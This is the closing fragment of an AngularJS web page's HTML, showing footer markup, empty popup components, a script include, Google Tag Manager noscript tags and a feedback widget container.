$ctrl.isContactUsMenuOpen --> </nav><!-- end ngIf: !$ctrl.isNative --> <!-- ngIf: $ctrl.showMobileFooter() --> </footer> </tng-footer-nav>

  <tng-idle-notice class="ng-isolate-scope"><!-- ngIf: $ctrl.showWarning --> </tng-idle-notice>
  <tng-connection-lost class="ng-isolate-scope"><!-- ngIf: $ctrl.showPopup --> </tng-connection-lost>
  <tng-app-confirm-exit class="ng-isolate-scope"><!-- ngIf: $ctrl.showPopup --> </tng-app-confirm-exit>
  <tng-contact-us-reload class="ng-isolate-scope"></tng-contact-us-reload>
  <!-- not needed for december pilot -->

  <!-- <script src="assets/js/gcb.min.js"></script> -->
  <script src="files/pm_fp.js"></script>

  
  <!-- Google Tag Manager (noscript) -->
  <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PN6BP5"
                    height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
  <!-- End Google Tag Manager (noscript) -->

  <!-- Dynatrace scripts: Mobile Only -->
  


<span style="position: absolute; top: -1000px;"><span><div id="KampyleAnimationContainer" style="z-index: 2147483000; border: 0px none; position: fixed; display: block; width: 0px; height: 0px;"></div></span></body></html>